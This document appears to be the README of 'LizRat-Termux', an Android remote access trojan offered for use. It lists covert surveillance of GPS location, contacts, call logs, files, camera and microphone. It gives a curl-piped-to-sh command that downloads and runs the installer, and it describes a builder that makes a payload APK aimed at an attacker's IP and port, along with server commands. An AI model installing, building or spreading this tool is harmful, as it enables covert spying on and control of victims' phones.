# LizRat-Termux:
This is a Android RAT tool inspired from L3MON. I Developed This tool to add some new features Like Camera Caputure & Recording.

# Featurs:
```bash
. GPS Logging
. Contacts Informations
. Call Logs
. File Manager
. Camera Acces (Both Front & Back)
. Mic Access
. Payload Builder removed
. Added New builder script written in Bash for both Termux & Linux.
. Now supports java 17. No need to install java 8
. one click installer
```

# Prerequisite Required in Termux: First copy & Paste Below Command to update your system thats it.
```bash
. apt update && apt upgrade    #optional step as script will do this.
```
# Finally! Copy and paste the below command and Grab a Coffee. (:
```bash
curl -s https://raw.githubusercontent.com/Bhartiya-Hacker/Liz-RAT/master/install.sh | sh
```

# How to setup username & pwd: Same for both Termux & Linux/ubuntu/Debian
```bash
. After first starting the server stop it and go to lizrat directory and search for "maindb.json".
  In there you have to type your username and passwrord(in md5 hash format)
. Again restart the server to login with your credentials.
```
# How to use Builder: Termux (Without Java 8)
```bash
. Type "lizb" anywhere to start building the payload. no need to start the server its totally offline.
. Type the IP & PORT and wait for the build to complete.
. after the built, apk can be found at home directory under lizrat_output
. "Lizrat_output" folder is not found then plz check if "apktool" is installed properly or not"
```

# How To Use: Execute Commands Anywhere in Termux
```bash
. To Start the server type "liz"
. To build the payload type "lizb"
. To stop the server type "lizx"
```

# How to install in ubuntu/linux/Debian:
```bash
. Clone the Repository.
. Install Any java (java 8:Recommend)
. Install Nodejs & npm
. Install pm2: npm install pm2 -g
. cd to "lizrat" Directory and type "npm install" & wait for the npm installation to complete
. Start Server: Type "pm2 start index.js" in lizrat directory.
. Stop Server: Type "Pm2 stop index.js" in lizrat directory
```
